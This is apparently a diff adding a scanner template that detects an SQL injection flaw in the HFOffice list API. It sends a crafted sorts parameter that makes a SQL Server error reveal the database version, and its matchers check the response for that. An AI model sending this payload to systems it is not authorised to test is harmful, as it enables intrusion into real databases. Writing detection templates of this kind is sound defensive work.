@@ -1,0 +1,25 @@
+id: poc-yaml-hongfan-HFOffice-list-sqli
+info:
+  name: HFOffice List API SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: sql-injection, critical
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/api/switch-value/list?sorts=[{"Field":"1-@@version"}]&conditions=[]&_ZQA_ID=4dc296c6c69905a7'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 400
+      - type: word
+        part: body
+        words:
+          - "Microsoft SQL Server"
+          - "nvarchar"
+      - type: word
+        part: header
+        words:
+          - "text/plain"
